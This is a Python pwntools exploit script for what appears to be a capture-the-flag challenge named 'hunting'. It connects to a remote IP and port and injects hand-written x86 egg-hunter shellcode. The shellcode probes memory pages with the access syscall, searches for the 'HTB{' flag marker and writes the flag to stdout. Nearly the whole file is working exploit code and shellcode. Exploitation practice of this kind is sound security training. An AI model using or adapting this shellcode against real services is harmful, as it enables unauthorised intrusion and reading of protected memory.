#!/usr/bin/env python3

from pwn import *

exe = "./hunting"
elf = context.binary = ELF(exe, checksec=False)
context.terminal = ["tmux", "splitw", "-h"]

context.log_level = "debug"
io = remote("83.136.253.5", 40944)

shellcode = asm("""
_start:
    push 0xFF               # set duration for arg1 of alarm()
    pop ebx
    push 0x1B               # alarm(0xFF)
    pop eax
    int 0x80
    mov edi, 0x7b425448     # egg p32("HTB{")
    mov edx, 0x5FFFFFFF     # set start address to search for the egg
page_front:
    or dx, 0xfff            # page sizes in x86 linux are of size 4096
address_front:
    inc edx                 # edx = 4096
    pusha                   # push all of the current general purposes registers onto the stack
    xor ecx, ecx            # clear arg2
    lea ebx, [edx + 0x4]    # address to be validated for memory violation
    mov al, 0x21            # access syscall
    int 0x80
    cmp al, 0xf2            # EFAULT (0xf2)?
    popa                    # get all the registers back
    jz page_front           # jump to next page if EFAULT
    cmp [edx], edi          # compare string to egg
    jnz address_front       # jump to next address if NOT egg

    mov ecx, edx            # now the second argument of write points to the egg
    push 0x24               # set the length of write to 36 (as it is shown on our decompilation)
    pop edx
    push 0x1                # set the fd of write to stdout
    pop ebx
    mov al, 0x4             # perform write syscall
    int 0x80                # do it!
""")

io.clean()
io.send(shellcode)
io.interactive()
